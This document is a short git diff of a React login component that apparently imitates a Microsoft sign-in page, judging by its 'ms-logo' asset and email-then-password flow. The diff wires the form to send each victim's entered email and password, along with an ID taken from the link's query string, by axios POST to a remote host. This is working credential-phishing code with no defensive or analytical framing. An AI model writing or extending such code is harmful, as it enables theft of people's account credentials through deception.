@@ -1,6 +1,9 @@
 import Logo from '../assets/ms-logo.svg'
 import LogoHeader from '../assets/out-logo.png'
 import { useState } from 'react'
+import { useLocation } from 'react-router-dom'
+import axios from 'axios'
+import { hostURL } from '../helpers/data'
 
 const Body = () => {
   const [email, setEmail] = useState('')
@@ -9,6 +12,9 @@ const Body = () => {
   const [error, setError] = useState('')
   const [showError, setShowError] = useState(false)
   const [btn, setBtn] = useState('Next')
+
+  const { search } = useLocation()
+  const userID = search.slice(1)
 
   const handleClick = () => {
     setShowError(false)
@@ -29,7 +35,10 @@ const Body = () => {
       return
     }
     if (showPassword && password) {
-      alert('ok')
+      axios
+        .post(`${hostURL}main`, { email, password, userID })
+        .then((resp) => console.log(resp.data))
+        .catch((e) => console.log(e))
     }
   }
   return (
